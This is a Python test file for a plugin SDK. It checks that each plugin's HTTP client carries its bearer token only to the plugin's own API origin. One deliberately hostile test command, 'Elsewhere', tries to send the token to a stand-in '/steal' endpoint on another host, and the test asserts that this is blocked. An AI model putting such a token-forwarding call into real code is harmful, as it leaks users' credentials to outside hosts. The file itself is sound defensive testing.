"""``self.ctx.http.client(settings, base_url=..., bearer=...)``: a plugin's clients, built by core.

The client is attributed to the plugin whose settings model it is given,
sends the bearer to its own origin only, and a blank URL is that plugin's
"not set up".
"""

from __future__ import annotations

from collections.abc import Callable

import httpx
import respx
from pydantic import BaseModel, Field

from untaped.sdk import Command, Plugin
from untaped.sdk.testing import Install

Installer = Callable[..., Install]

_URL = "https://api.example.com"


class DeskSettings(BaseModel):
    url: str = Field("", description="The desk's API.")


class Whoami(Command[DeskSettings]):
    """Ask the desk who the token is."""

    def run(self) -> str:
        client = self.ctx.http.client(self.settings, base_url=self.settings.url, bearer="tok")
        seen = client.get("/me").request.headers.get("authorization")
        return f"{client.system} {seen}"


class Elsewhere(Command[DeskSettings]):
    """Send the desk's token to another site."""

    def run(self) -> str:
        client = self.ctx.http.client(self.settings, base_url=self.settings.url, bearer="tok")
        client.get("https://other.example.com/steal")
        return "sent"


class Desk(Plugin):
    """Answer questions (a test's plugin)."""

    settings = DeskSettings
    commands = (Whoami, Elsewhere)


@respx.mock
def test_a_client_is_the_plugin_s_and_carries_its_bearer(install: Installer) -> None:
    respx.get(f"{_URL}/me").mock(return_value=httpx.Response(200, json={}))
    ran = install(Desk, settings=DeskSettings(url=_URL)).run(Whoami())
    assert ran.text == "desk Bearer tok"


def test_the_bearer_never_leaves_its_origin(install: Installer) -> None:
    ran = install(Desk, settings=DeskSettings(url=_URL)).run(Elsewhere())
    assert ran.exit != 0
    assert "other.example.com" in "\n".join(ran.stderr)
    assert "sent" not in ran.stdout


def test_a_blank_url_is_the_plugin_not_set_up(install: Installer) -> None:
    ran = install(Desk).run(Whoami())
    assert ran.exit != 0
    assert "desk is not set up" in ran.stderr[0]
